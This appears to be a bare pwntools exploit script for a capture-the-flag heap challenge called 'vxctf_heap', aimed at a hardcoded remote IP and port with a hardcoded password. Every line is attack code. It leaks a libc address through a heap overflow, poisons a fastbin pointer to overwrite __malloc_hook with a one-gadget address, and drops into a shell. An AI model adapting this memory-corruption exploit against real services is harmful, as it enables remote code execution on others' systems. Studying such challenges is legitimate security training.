from pwn import *

def add(content):
    r.sendlineafter('>>', '1')
    r.sendlineafter('>>', str(len(content)))
    r.sendafter('>>', content)
def remove(idx):
    r.sendlineafter('>>', '2')
    r.sendlineafter('>>', str(idx))
def edit(idx, content):
    r.sendlineafter('>>', '3')
    r.sendlineafter('>>', str(idx))
    r.sendlineafter('>>', str(len(content)))
    r.sendafter('>>', content)
def view(idx):
    r.sendlineafter('>>', '4')
    r.sendlineafter('>>', str(idx))

# init
os.environ['LD_PRELOAA'] = './libc-2.23.so'
#r = process('./vxctf_heap')
r = remote('35.194.219.218', 8238)
e = ELF('./vxctf_heap')
libc = e.libc

# login
password = ' AeD=Q]r$D'
r.sendline(password)

# leak libc
add('A'*0x80)
add('A'*0x80)
add('A'*0x80)
remove(1)
edit(0, 'B'*0x90)
view(0)
r.recvuntil('B'*0x90)
libc_base = u64(r.recv(6)+'\x00\x00')-libc.symbols['__malloc_hook']-0x68
log.info('libc base: %#x' % libc_base)

# restore heap
edit(0, 'B'*0x80+p64(0)+p64(0x91))
add('A'*0x80)

# double free
target = 0x7ffff7839aed-0x7ffff7475000+libc_base
magic = libc_base + 0xf1147 
log.info('target: %#x' % target)
add('A'*0x60)#3
add('A'*0x60)#4
add('A'*0x60)#5
remove(4)
remove(3)
edit(2, 'A'*0x80+p64(0)+p64(0x71)+p64(target))

add('A'*0x60)#5
add('\x00'*0x13+p64(magic)+'\x00'*(0x60-0x13-8))#5


# exploit



r.interactive()

